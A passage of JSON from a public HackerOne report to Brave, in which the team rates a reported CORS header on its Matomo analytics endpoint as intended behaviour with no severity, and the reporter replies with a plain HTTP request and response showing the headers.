https://hackerone.com/matomo","automated_response":false,"created_at":"2020-09-04T00:34:52.481Z","updated_at":"2020-09-04T00:34:52.481Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9124651,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-04T00:34:52.575Z","updated_at":"2020-09-04T00:34:52.575Z","actor":{"username":"diracdeltas","cleared":false,"url":"/diracdeltas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/115/616/4e2016543ea3e299dcadd088be7d0225de3419e0_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9132696,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, just to follow-up, here's a public report about it where upstream points out that it is intended behavior: https://github.com/matomo-org/matomo/issues/16380","automated_response":false,"created_at":"2020-09-04T18:08:00.203Z","updated_at":"2020-09-04T18:08:00.203Z","actor":{"username":"fmarier","cleared":false,"url":"/fmarier","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/164/5ccc7f221450d705333b28dc1d4c0eb673b24684_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9132700,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-09-04T18:08:11.705Z","updated_at":"2020-09-04T18:08:11.705Z","additional_data":{"old_severity":"Low","new_severity":"None","old_severity_id":815709,"new_severity_id":837973},"actor":{"username":"fmarier","cleared":false,"url":"/fmarier","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/460/164/5ccc7f221450d705333b28dc1d4c0eb673b24684_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9133032,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I read the explanations. But Access-Control-Allow-Origin \"*\" and should not be \"true\". It means accepting all requests. This problem can be detected even without adding an Origin expression. The related image is attached.\n\n```javascript\nREQUEST\nPOST /piwik.php?action_name=%241%20Million%20Token%20Giveaway%20|%20Brave%20Browser\u0026idsite=2\u0026rec=1\u0026r=571761\u0026h=19\u0026m=14\u0026s=56\u0026url=https%3A%2F%2Fbrave.com%2Fmillion%2F\u0026_id=\u0026_idts=1596989696\u0026_idvc=1\u0026_idn=1\u0026_refts=0\u0026_viewts=1596989696\u0026send_image=1\u0026cookie=1\u0026res=1366x768\u0026gt_ms=3109\u0026pv_id= HTTP/1.1\nHost: analytics.brave.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: tr-TR,en;q=0.8,tr;q=0.5,en-US;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\n\n\nRESPONESE\nHTTP/1.1 200 OK\nConnection: close\nContent-Length: 43\nServer: Apache/2.4.29 (Ubuntu)\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\nContent-Type: image/gif\nAccept-Ranges: bytes\nDate: Fri, 04 Sep 2020 18:22:54 GMT\nVia: 1.1 varnish\nX-Served-By: cache-hhn4058-HHN\nX-Cache: MISS\nX-Cache-Hits: 0\nX-Timer: S1599243774.114067,VS0,VE729\nVary: Origin\n\nGIF89a\u0001\n","automated_response":false,"created_at":"2020-09-04T18:27:31.878Z","updated_at":"2020-09-04T18:27:31.878Z","actor":{"username":"drwx","cleared":false,"url":"/drwx","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/nG69YcureYKxYG4AbroCwesq/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"brave","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}